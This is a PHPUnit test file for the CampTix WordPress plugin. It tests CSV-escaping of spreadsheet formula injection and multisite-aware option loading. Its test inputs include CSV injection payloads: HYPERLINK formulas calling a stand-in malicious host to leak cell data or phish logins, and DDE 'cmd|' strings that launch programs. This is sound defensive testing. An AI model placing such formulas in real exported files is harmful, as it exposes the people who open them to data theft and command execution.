<?php

defined( 'WPINC' ) or die();

/**
 * @covers CampTix_Plugin
 */
class Test_CampTix_Plugin extends \WP_UnitTestCase {
	/**
	 * @covers CampTix_Plugin::esc_csv
	 */
	public function test_esc_csv() {
		$test_input = array(
			// Safe
			'CampTix',

			// Cells starting with trigger characters
			'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
			'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
			"-2+3+cmd|' /C mstsc'!A0",
			"+2+3+cmd|' /C mspaint'!A0",
			";2+3+cmd|' /C calc'!A0",

			// Cells split by delimiters
			"foo ;=cmd|' /C SoundRecorder'!A0",
			"foo\n-2+3+cmd|' /C explorer'!A0",
			"   -2+3+cmd|' /C notepad'!A0",
			" -2+3+cmd|' /C calc'!A0",

			//mb tests
			"漢字はユニコ",
			"-漢字はユニコ ;=æ",
		);

		$expected_output = array(
			// Safe
			'CampTix',

			// Cells starting with trigger character
			'\'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
			'\'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
			"'-2+3+cmd|' /C mstsc'!A0",
			"'+2+3+cmd|' /C mspaint'!A0",
			"';2+3+cmd|' /C calc'!A0",

			// Cells split by delimiters
			"foo ;'=cmd|' /C SoundRecorder'!A0",
			"foo\n'-2+3+cmd|' /C explorer'!A0",
			"'   '-2+3+cmd|' /C notepad'!A0",
			"' '-2+3+cmd|' /C calc'!A0",

			//mb_tests
			"漢字はユニコ",
			"'-漢字はユニコ ;'=æ",
		);

		$this->assertSame( $expected_output, CampTix_Plugin::esc_csv( $test_input ) );
	}

	/**
	 * Options should reflect the current site after `switch_to_blog()`,
	 * so multisite callers like the centralized Stripe webhook can read
	 * the switched-to site's settings without manually reloading them.
	 *
	 * @covers CampTix_Plugin::get_options
	 * @group  ms-required
	 */
	public function test_get_options_is_blog_aware() {
		if ( ! is_multisite() ) {
			$this->markTestSkipped( 'Multisite is required for this test.' );
		}

		/** @var CampTix_Plugin $camptix */
		global $camptix;

		$other_blog_id = self::factory()->blog->create();

		// Seed a distinct option directly on the secondary site, before any
		// code on that site has loaded CampTix options.
		$secondary_seed = array(
			'event_name' => 'Secondary Event',
			'version'    => $camptix->version,
		);
		switch_to_blog( $other_blog_id );
		update_option( 'camptix_options', $secondary_seed );
		restore_current_blog();

		switch_to_blog( $other_blog_id );
		$secondary_options = $camptix->get_options();
		$this->assertSame( 'Secondary Event', $secondary_options['event_name'] );
		restore_current_blog();

		// After restoring, the cached copy should be invalidated and re-fetched
		// for the primary site, which has its own (different) event name.
		$primary_options = $camptix->get_options();
		$this->assertNotSame( 'Secondary Event', $primary_options['event_name'] );
	}
}
